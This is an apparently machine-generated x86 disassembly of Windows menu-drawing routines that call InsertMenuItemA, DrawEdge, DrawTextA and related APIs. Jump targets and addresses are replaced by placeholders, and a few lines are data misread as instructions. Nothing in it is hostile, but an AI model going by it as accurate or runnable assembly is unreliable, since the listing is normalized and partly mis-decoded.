mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4043a8
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_44c7a4
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_44ad38
mov [ ebp - 0x25 ] eax
sub_44aaa3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44a828
xor eax eax
pop ebp
retn
sub_44aac8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44e39c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44d364
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44d860
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44a264
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44ab38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44ab82
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418b80
mov eax [ ebp - 0x4 ]
call sub_44a0ec
mov edx eax
mov eax ebx
call sub_44c7d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ab89
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_44ab90
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44ac08
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_419b20
sub_44abcc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419ea0
mov eax ebx
call sub_44c78c
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_44c78c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403394
pop esi
pop ebx
retn
mov eax ebx
call sub_44ac08
sub_44ac08
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_44ad38
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44ac08
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_44ad38
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_44ad38
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44aac8
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebp
call sub_44ad38
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44acd8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_44c7a4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_44c7b4
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_44c7b4
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_44c7b4
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_449de0
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_44ad38
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44aac8
mov eax [ rw-data ]
call sub_449de0
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44ad84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419dc8
push ebx
push sub_44ab38
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_44adc8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44afac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44cd60
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403f80
test bh 0x4
je r-xdata
mov eax edi
call sub_44e39c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042f4
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d734
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041b0
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41d0e4
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41d0f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44afb3
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd60
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041a8
push eax
mov eax [ ebp - 0xc ]
call sub_4043a8
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd60
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41ce24
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041a8
push eax
mov eax [ ebp - 0xc ]
call sub_4043a8
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd60
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41ce24
mov eax 0xff00000d
call sub_41c964
mov esi eax
mov eax 0xff000010
call sub_41c964
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41ce24
jmp r-xdata
sub_44b018
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44b900
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d618
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41ce24
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042f4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d618
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447bb4
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd60
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d610
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d618
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44b45f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_423028
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41ce24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447bb4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d618
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d610
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4240cc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5ec
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db40
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4480cc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d618
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44adc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41d0f0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd60
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d910
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41ce24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403198
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd60
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44adc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
